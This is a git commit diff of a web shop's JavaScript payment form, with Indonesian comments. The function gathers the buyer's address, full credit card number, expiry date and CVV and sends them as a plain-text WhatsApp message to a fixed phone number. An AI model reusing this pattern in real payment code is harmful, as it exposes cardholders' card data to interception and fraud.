51b71d50ccb708adc232e3b861f1edcf3fca317c
yosuaelw <cuatiawww@gmail.com>
2023-07-01 23:05:37 +0700

    update patch

--- public/js/paymentForm.js
+++ public/js/paymentForm.js
@@ -1,39 +1,24 @@
 function sendWhatsAppMessage() {
-    //Mengnangkap form html 
+    // Mengambil nilai dari formulir HTML
     let username = document.getElementsByName('username')[0].value;
     let email = document.getElementsByName('email')[0].value;
     let address = document.getElementsByName('address')[0].value;
     let city = document.getElementsByName('city')[0].value;
     let state = document.getElementsByName('state')[0].value;
     let zipcode = document.getElementsByName('zipcode')[0].value;
+    let kodeBrg = document.getElementsByName('kodeBarang')[0].value;
     let cardname = document.getElementsByName('cardname')[0].value;
     let cardnumber = document.getElementsByName('cardnumber')[0].value;
     let expmonth = document.getElementsByName('expmonth')[0].value;
     let expyear = document.getElementsByName('expyear')[0].value;
     let cvv = document.getElementsByName('cvv')[0].value;
 
-    // WA URL
+    // URL WhatsApp
     let whatsappUrl = "https://api.whatsapp.com/send?phone=6281908775565&text=";
 
     // Isi pesan
-    let message = "Username: " + username + "<br>";
-    message += "Email: " + email + "<br>";
-    message += "Address: " + address + "<br>";
-    message += "City: " + city + "<br>";
-    message += "State: " + state + "<br>";
-    message += "Zip Code: " + zipcode + "<br>";
-    message += "Name on Card: " + cardname + "<br>";
-    message += "Credit Card Number: " + cardnumber + "<br>";
-    message += "Exp Month: " + expmonth + "<br>";
-    message += "Exp Year: " + expyear + "<br>";
-    message += "CVV: " + cvv;
+    let message = `Username: ${username}\r\n\r\nEmail: ${email}\r\n\r\nAddress: ${address}\r\n\r\nCity: ${city}\r\n\r\nState: ${state}\r\n\r\nZip Code: ${zipcode}\r\n\r\nItem code: ${kodeBrg}\r\n\r\nName on Card: ${cardname}\r\n\r\nCredit Card Number: ${cardnumber}\r\n\r\nExp Month: ${expmonth}\r\n\r\nExp Year: ${expyear}\r\n\r\nCVV: ${cvv}`;
 
-    // memastikan karakte khusus terenkripsi dengan benar.
-    let encodedMessage = encodeURIComponent(message);
-
-    whatsappUrl += encodedMessage;
-
-    //  membuka WhatsApp di jendela baru 
-    window.open(whatsappUrl);
+    // Membuka WhatsApp di jendela baru
+    window.open(whatsappUrl + encodeURIComponent(message));
 }
-
